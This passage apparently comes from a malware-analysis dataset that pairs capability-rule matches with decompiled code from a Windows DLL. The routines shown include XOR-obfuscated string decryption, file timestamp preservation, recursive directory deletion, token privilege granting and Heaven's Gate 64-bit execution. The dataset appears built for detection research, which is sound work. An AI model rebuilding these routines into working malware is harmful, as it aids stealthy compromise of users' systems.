puVar1[&var_5ch - var_10h];\n    } while (uVar8 < 0x34);\n    fcn.00403bde(\"GTK DLL: files.cpp:%d > FilesGetWindowsFilesTimes : decrypt (wide char) %s -> %ws\", 0xee);\n    iVar3 = fcn.00406e7e();\n    if (iVar3 != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar3, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar4 != 0) && (iVar4 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar3, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    }\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    return 0;\n}\n",
        "token_count": 1371
    },
    "0040720d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040720d(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.00406e7e();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.00406fd5(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 430
    },
    "004072c1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004072c1(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t in_ECX;\n    int32_t iVar12;\n    uint var_24h;\n    uint hFindFile;\n    uint lpString1;\n    uint lpString2;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint lpFindFileData;\n    \n    iVar12 = 8;\n    var_14h = 0x104;\n    fcn.00403bde(\"GTK DLL: files.cpp:%d > FilesClearDirectory : clean %ws\", 0x2be);\n    iVar2 = fcn.00406e7e();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(in_ECX);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (iVar5 != 0) {\n        uVar4 = (*pcVar1)(0, iVar3 * 2 + 0xc);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        if (iVar6 != 0) {\n            uVar4 = (*pcVar1)(0, 0x250);\n            puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            if (puVar7 != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar5, in_ECX);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar5, 0x415924);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar6, in_ECX);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar6, L\"\\\\*.*\");\n                fcn.00403bde(\"GTK DLL: files.cpp:%d > FilesClearDirectory : SearchPath : %ws\", 0x2df);\n                iVar8 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar6, puVar7);\n                if (iVar8 == -1) {\n                    iVar12 = 3;\n                }\n                else {\n                    iVar12 = 0;\n                    piVar9 = puVar7 + 0x2c;\n                    do {\n                        fcn.00403bde(\"GTK DLL: files.cpp:%d > FilesClearDirectory : FindFileData->cFileName : %p\", 0x2ef\n                                    );\n                        fcn.00403bde(\"GTK DLL: files.cpp:%d > FilesClearDirectory : FindFileData->cFileName : %ws\", \n                                     0x2f0);\n                        if (*piVar9 != 0x2e) {\n                            iVar10 = (*_sym.imp.KERNEL32.dll_lstrlenW)(piVar9);\n                            uVar11 = iVar10 + 2 + iVar3;\n                            if (var_14h < uVar11) {\n                                uVar4 = (*pcVar1)(0, iVar5);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                                uVar4 = (*pcVar1)(0, uVar11 * 2);\n                                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                                if (iVar5 == 0) {\n                                    iVar12 = 8;\n                                    break;\n                                }\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar5, in_ECX);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar5, 0x415924);\n                                var_14h = uVar11;\n                            }\n                            else {\n                                *(iVar5 + 2 + iVar3 * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar5, piVar9);\n                            if ((*puVar7 & 0x10) == 0) {\n                                iVar10 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(iVar5);\n                            }\n                            else {\n                                iVar12 = fcn.004072c1(arg_8h);\n                                if (iVar12 != 0) break;\n                                iVar10 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(iVar5);\n                            }\n                            if ((iVar10 == 0) && (arg_8h == 0)) {\n                                iVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar8, puVar7);\n                    } while (iVar10 != 0);\n                    fcn.00403bde(\"GTK DLL: files.cpp:%d > FilesClearDirectory : done here\", 0x328);\n                }\n                uVar4 = (*pcVar1)(0, puVar7);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            }\n            uVar4 = (*pcVar1)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        if (iVar5 != 0) {\n            uVar4 = (*pcVar1)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    if (iVar2 != 0) {\n        uVar4 = (*pcVar1)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    return iVar12;\n}\n",
        "token_count": 1334
    },
    "0040787f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040787f(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 == 0) ||\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 == 0)) {\n            fcn.00403bde(\"GTK DLL: globals.cpp:%d > GetHostProcessW : Converting to multibyte failed.\", 0x100);\n            uVar1 = var_4h;\n        }\n        else {\n            uVar1 = fcn.004077d4();\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 349
    },
    "0040b0be": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040b0be(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.0040c06a();\n    if (iVar2 == 0) {\n        iVar2 = fcn.0040a4ba(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.0040a540(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x427d3c & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.0040af35();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.0040af35();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 543
    },
    "0040e407": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e407(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x427df4 = 1;\n    fcn.0040569c(param_1);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x427d40);\n    if (iVar1 != -1) {\n        fcn.00407516();\n    }\n    fcn.0040df00();\n    fcn.0040d9c0();\n    fcn.0040de13();\n    return;\n}\n",
        "token_count": 124
    },
    "00401815": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00401815(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_30h = 0x3c3b3233;\n    var_2ch = 0x2a735723;\n    var_28h = 0x31300333;\n    var_24h._0_2_ = 0x3412;\n    var_24h._2_1_ = 0x7a;\n    var_14h = 0x536c417a;\n    var_10h._0_2_ = 0x6154;\n    var_10h._2_1_ = 0x47;\n    fcn.00401000(0xf);\n    iVar7 = 0;\n    var_8h = 7;\n    do {\n        puVar1 = iVar7 + var_ch;\n        iVar5 = iVar7 % 7;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_14h + iVar5) ^ puVar1[&var_30h - var_ch];\n    } while (iVar7 < 0xf);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > IsProcessUnderWow64 : decrypt (char) %s -> %s\", 0xb3);\n    var_30h = 0x2d21162d;\n    var_2ch = 0x744b050a;\n    var_28h = 0x32f375d;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x69);\n    var_20h = 0x43537346;\n    var_1ch._0_2_ = 0x696f;\n    var_1ch._2_1_ = 0x78;\n    fcn.00401000(0xd);\n    iVar7 = var_14h;\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_14h;\n        iVar6 = iVar5 % var_8h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_20h + iVar6) ^ puVar1[&var_30h - var_14h];\n    } while (iVar5 < 0xd);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > IsProcessUnderWow64 : decrypt (char) %s -> %s\", 0xb4);\n    iVar5 = var_ch;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar7, var_ch);\n    *0x428210 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    if (*0x428210 != NULL) {\n        iVar6 = (**0x428210)(var_18h, &var_4h);\n        var_4h = -(iVar6 != 0) & var_4h;\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = var_4h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar5);\n    (*pcVar2)(uVar4);\n    return var_ch;\n}\n",
        "token_count": 922
    },
    "00409f97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409f97(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &var_30h;\n    var_10h = param_2;\n    for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_18h = *0x427d38;\n    uVar5 = 0;\n    var_14h = 0;\n    var_4h = 0;\n    var_30h = 0x18;\n    var_2ch = 0;\n    var_24h = 0;\n    var_28h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    iVar4 = (*_sym.imp.ntdll.dll_ZwOpenProcess)(&var_ch, 0x400, &var_30h, &var_18h);\n    if (-1 < iVar4) {\n        iVar4 = (*_sym.imp.ntdll.dll_ZwOpenProcessToken)(var_ch, 8, &var_8h);\n        pcVar1 = _sym.imp.ntdll.dll_ZwQueryInformationToken;\n        if (-1 < iVar4) {\n            (*_sym.imp.ntdll.dll_ZwQueryInformationToken)(var_8h, 1, 0, 0, &var_4h);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar4 = (*pcVar1)(var_8h, 1, puVar3, var_4h, &var_4h);\n                if (-1 < iVar4) {\n                    puVar6 = *puVar3;\n                    puVar7 = var_10h;\n                    for (iVar4 = 0x1c; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar7 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                        puVar7 = puVar7 + 1;\n                    }\n                    uVar5 = 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.ntdll.dll_ZwClose)(var_8h);\n        }\n        (*_sym.imp.ntdll.dll_ZwClose)(var_ch);\n    }\n    return uVar5;\n}\n",
        "token_count": 731
    },
    "0040bf79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.0040bf79(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    _var_2ch = 0;\n    iVar2 = fcn.0040be30(&var_24h, &var_8h);\n    if (iVar2 == 0) {\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_8h, 0x3000, 4);\n        uVar4 = var_24h;\n        iVar2 = var_20h;\n        iVar5 = var_8h;\n        var_10h = arg_8h_00;\n        if (arg_8h_00 != 0) {\n            do {\n                var_1ch = uVar4;\n                var_18h = iVar2;\n                var_8h = arg_8h_00;\n                fcn.0040b372(arg_8h_00, 0x1000);\n                iVar1 = var_10h;\n                arg_8h_00 = var_8h + 0x1000;\n                var_1ch = uVar4 + 0x1000;\n                var_18h = iVar2 + (0xffffefff < uVar4);\n                iVar5 = iVar5 + -0x1000;\n                uVar4 = var_1ch;\n                iVar2 = var_18h;\n            } while (iVar5 != 0);\n            var_8h = arg_8h_00;\n            puVar3 = fcn.0040a4ba(0x1000);\n            if (puVar3 == NULL) {\n                fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupGetProcessFunctionAddressArch : PeSupGetExportEntry fail\", \n                             0x501);\n            }\n            else {\n                _var_2ch = CONCAT44(var_20h + CARRY4(*puVar3, var_24h), *puVar3 + var_24h);\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n        }\n    }\n    else {\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupGetProcessFunctionAddressArch : PsSupGetProcessModuleBaseArch fail\", \n                     0x4df);\n    }\n    return _var_2ch;\n}\n",
        "token_count": 660
    },
    "00401a76": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401a76(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t var_e4h;\n    int32_t var_e0h;\n    int32_t var_dch;\n    int32_t var_d8h;\n    int32_t var_d4h;\n    int32_t var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t var_b4h;\n    int32_t var_b0h;\n    int32_t var_ach;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x270d0167;\n    var_14h = 0x20325901;\n    var_10h = 0x30250b60;\n    var_ch._0_1_ = 10;\n    var_ch._1_1_ = 0x68;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 0x2c;\n    var_8h._0_1_ = 0x42;\n    var_8h._1_1_ = 0xd;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x30;\n    var_4h._0_1_ = 3;\n    var_4h._1_1_ = 0x5d;\n    var_4h._2_1_ = 0x46;\n    var_28h = 0x554e6434;\n    var_24h = 0x45463864;\n    fcn.00401000(0x17);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_d4h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_18h - var_d4h];\n    } while (uVar6 < 0x17);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x116);\n    fcn.0040d022();\n    var_20h = 0x430a5d00;\n    var_1ch = 0x1d030b39;\n    var_18h = 0x5d224a03;\n    var_14h = 0x271d102b;\n    var_10h = 0x5e2e533c;\n    var_ch._0_1_ = 0x1a;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 0xd;\n    var_ch._3_1_ = 5;\n    var_8h._0_1_ = 0x3a;\n    var_8h._1_1_ = 0x54;\n    var_8h._2_1_ = 0x2e;\n    var_8h._3_1_ = 0x57;\n    var_4h._0_1_ = 0x2f;\n    var_4h._1_1_ = 0x62;\n    var_28h = 0x304b3853;\n    var_24h = 0x7364624a;\n    fcn.00401000(0x1e);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_cch;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_20h - var_cch];\n    } while (uVar6 < 0x1e);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x119);\n    fcn.0040d022();\n    var_18h = 0x13f3137;\n    var_14h = 0x1090255;\n    var_10h = 0x4f1c1c39;\n    var_ch._0_1_ = 0x39;\n    var_ch._1_1_ = 0x36;\n    var_ch._2_1_ = 0xd;\n    var_ch._3_1_ = 0x22;\n    var_8h._0_1_ = 0x1a;\n    var_8h._1_1_ = 2;\n    var_8h._2_1_ = 0x53;\n    var_8h._3_1_ = 0xe;\n    var_4h._0_1_ = 0x21;\n    var_4h._1_1_ = 100;\n    var_80h = 0x6e735464;\n    var_7ch._0_2_ = 0x6936;\n    var_7ch._2_1_ = 0x44;\n    fcn.00401000(0x16);\n    iVar8 = 0;\n    var_2ch = 7;\n    do {\n        puVar1 = iVar8 + var_c4h;\n        iVar7 = iVar8 % 7;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_80h + iVar7) ^ puVar1[&var_18h - var_c4h];\n    } while (iVar8 < 0x16);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x11c);\n    fcn.0040d022();\n    var_1ch = 0x231d090b;\n    var_18h = 0x32513019;\n    var_14h = 0x3805092b;\n    var_10h = 0x3553615;\n    var_ch._0_1_ = 0x2a;\n    var_ch._1_1_ = 5;\n    var_ch._2_1_ = 0x22;\n    var_ch._3_1_ = 0x24;\n    var_8h._0_1_ = 0x16;\n    var_8h._1_1_ = 0x27;\n    var_8h._2_1_ = 0x53;\n    var_8h._3_1_ = 0x36;\n    var_4h._0_1_ = 0x58;\n    var_28h = 0x4d546c58;\n    var_24h = 0x5334427a;\n    fcn.00401000(0x19);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_80h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_1ch - var_80h];\n    } while (uVar6 < 0x19);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x11f);\n    fcn.0040d022();\n    var_1ch = 0x1e010a02;\n    var_18h = 0x58282501;\n    var_14h = 0x15200632;\n    var_10h = 0x412a0316;\n    var_ch._0_1_ = 0x24;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 4;\n    var_ch._3_1_ = 2;\n    var_8h._0_1_ = 0x1b;\n    var_8h._1_1_ = 0x3c;\n    var_8h._2_1_ = 0x2d;\n    var_8h._3_1_ = 0x5d;\n    var_4h._0_1_ = 0x34;\n    var_4h._1_1_ = 8;\n    var_4h._2_1_ = 0x31;\n    var_4h._3_1_ = 0x70;\n    var_28h = 0x70546f51;\n    var_24h = 0x31444a72;\n    fcn.00401000(0x1c);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_b4h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_1ch - var_b4h];\n    } while (uVar6 < 0x1c);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x122);\n    fcn.0040d022();\n    var_1ch = 0x20011107;\n    var_18h = 0x3a3f1c1a;\n    var_14h = 0x1a220d11;\n    var_10h = 0x3a231b;\n    var_ch._0_1_ = 0x1c;\n    var_ch._1_1_ = 0x33;\n    var_ch._2_1_ = 0x10;\n    var_ch._3_1_ = 2;\n    var_8h._0_1_ = 0x3f;\n    var_8h._1_1_ = 0x38;\n    var_8h._2_1_ = 0x11;\n    var_8h._3_1_ = 0x2b;\n    var_4h._0_1_ = 0x24;\n    var_4h._1_1_ = 0x79;\n    var_70h = 0x414c7454;\n    var_6ch._0_2_ = 0x7479;\n    var_6ch._2_1_ = 0x56;\n    fcn.00401000(0x1a);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_ach;\n        iVar7 = iVar8 % var_2ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_70h + iVar7) ^ puVar1[&var_1ch - var_ach];\n    } while (iVar8 < 0x1a);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x125);\n    fcn.0040d022();\n    var_10h = 0x13230824;\n    var_ch._0_1_ = 1;\n    var_ch._1_1_ = 4;\n    var_ch._2_1_ = 0x40;\n    var_ch._3_1_ = 0x20;\n    var_8h._0_1_ = 1;\n    var_8h._1_1_ = 4;\n    var_8h._2_1_ = 0x1b;\n    var_8h._3_1_ = 0x15;\n    var_4h._0_1_ = 4;\n    var_4h._1_1_ = 0x31;\n    var_4h._2_1_ = 0x32;\n    var_28h = 0x70776d77;\n    var_24h = 0x49325463;\n    fcn.00401000(0xf);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_70h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_10h - var_70h];\n    } while (uVar6 < 0xf);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x128);\n    fcn.0040d022();\n    